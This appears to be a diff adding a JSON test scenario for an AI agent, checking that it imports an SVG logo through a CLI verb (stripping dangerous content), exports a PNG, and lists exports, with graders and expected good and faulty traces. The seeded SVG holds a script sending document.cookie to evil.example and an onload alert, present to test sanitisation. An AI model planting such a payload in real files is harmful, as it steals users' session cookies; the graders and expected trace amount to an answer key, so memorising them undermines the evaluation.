@@ -1,0 +1,183 @@
+{
+  "format": "maude.agent-journey/1",
+  "id": "S8",
+  "package": "S8",
+  "title": "A logo comes in through the import verb (cleaned); an export goes through the export verb",
+  "ledger": [],
+  "fixture": "app5",
+  "allow": ["maude design export"],
+  "setup": [
+    {
+      "op": "write",
+      "path": "incoming/brand-mark.svg",
+      "text": "<svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 64 64\"><script>fetch(\"https://evil.example/?c=\"+document.cookie)</script><rect width=\"64\" height=\"64\" rx=\"12\" fill=\"#6d5dfc\" onload=\"alert(1)\"/></svg>\n"
+    },
+    { "op": "write", "path": "out/.keep", "text": "" }
+  ],
+  "turns": [
+    {
+      "say": "Bring the logo file .design/incoming/brand-mark.svg into this project’s assets."
+    },
+    {
+      "say": "Export the “publish” artboard of ui/GitPanel.tsx as a PNG into .design/out/."
+    },
+    {
+      "say": "List the exports this project has so far."
+    }
+  ],
+  "graders": [
+    {
+      "id": "asset-imported",
+      "grader": "files",
+      "dir": "assets",
+      "match": "^[0-9a-f]{8}\\.svg$",
+      "has": ["<rect"],
+      "min": 1
+    },
+    {
+      "id": "asset-clean",
+      "grader": "files",
+      "dir": "assets",
+      "match": "^[0-9a-f]{8}\\.svg$",
+      "has": ["<svg"],
+      "lacks": ["<script", "\\bon[a-z]+\\s*="],
+      "min": 1
+    },
+    {
+      "id": "import-by-verb",
+      "grader": "tool-used",
+      "tool": "Bash",
+      "input": "maude design import-asset"
+    },
+    {
+      "id": "export-written",
+      "grader": "files",
+      "dir": "out",
+      "match": "\\.png$",
+      "has": ["PNG"],
+      "min": 1
+    },
+    {
+      "id": "export-by-verb",
+      "grader": "tool-used",
+      "tool": "Bash",
+      "input": "maude design export(?!s)\\b"
+    },
+    {
+      "id": "exports-listed",
+      "grader": "tool-used",
+      "tool": "Bash",
+      "input": "maude design exports list"
+    },
+    {
+      "id": "no-route-by-hand",
+      "grader": "no-tool",
+      "tool": "Bash",
+      "input": "curl[^\"]*_api/(asset|export|import-asset)"
+    },
+    {
+      "id": "canvas-untouched",
+      "grader": "untouched",
+      "path": "ui/GitPanel.tsx"
+    }
+  ],
+  "dry": {
+    "good": [
+      {
+        "op": "action",
+        "kind": "migration.import",
+        "label": "Version history starts here",
+        "effects": [
+          {
+            "lane": "@manifest",
+            "op": "create",
+            "path": "ui/GitPanel.tsx"
+          }
+        ]
+      },
+      {
+        "tag": "asset",
+        "op": "write",
+        "path": "assets/3f9a1c2e.svg",
+        "text": "<svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 64 64\"><rect width=\"64\" height=\"64\" rx=\"12\" fill=\"#6d5dfc\"/></svg>"
+      },
+      {
+        "tag": "imp",
+        "op": "tool",
+        "name": "Bash",
+        "input": {
+          "command": "maude design import-asset .design/incoming/brand-mark.svg"
+        }
+      },
+      {
+        "tag": "png",
+        "op": "write",
+        "path": "out/GitPanel-publish.png",
+        "text": "\u0089PNG\r\n\u001a\n"
+      },
+      {
+        "tag": "exp",
+        "op": "tool",
+        "name": "Bash",
+        "input": {
+          "command": "maude design export png ui/GitPanel.tsx --artboard publish"
+        }
+      },
+      {
+        "tag": "list",
+        "op": "tool",
+        "name": "Bash",
+        "input": {
+          "command": "maude design exports list"
+        }
+      }
+    ],
+    "faults": {
+      "asset-imported": {
+        "drop": ["asset"]
+      },
+      "asset-clean": {
+        "replace": {
+          "asset": {
+            "op": "write",
+            "path": "assets/3f9a1c2e.svg",
+            "text": "<svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 64 64\"><script>fetch(\"https://evil.example/?c=\"+document.cookie)</script><rect width=\"64\" height=\"64\" rx=\"12\" fill=\"#6d5dfc\" onload=\"alert(1)\"/></svg>\n"
+          }
+        }
+      },
+      "import-by-verb": {
+        "drop": ["imp"]
+      },
+      "export-written": {
+        "drop": ["png"]
+      },
+      "export-by-verb": {
+        "drop": ["exp"]
+      },
+      "exports-listed": {
+        "drop": ["list"]
+      },
+      "no-route-by-hand": {
+        "add": [
+          {
+            "op": "tool",
+            "name": "Bash",
+            "input": {
+              "command": "curl -s -X POST http://127.0.0.1:4399/_api/export -d @job.json"
+            }
+          }
+        ]
+      },
+      "canvas-untouched": {
+        "add": [
+          {
+            "op": "edit",
+            "path": "ui/GitPanel.tsx",
+            "old": ">Save all<",
+            "new": ">Save everything<"
+          }
+        ]
+      }
+    }
+  }
+}
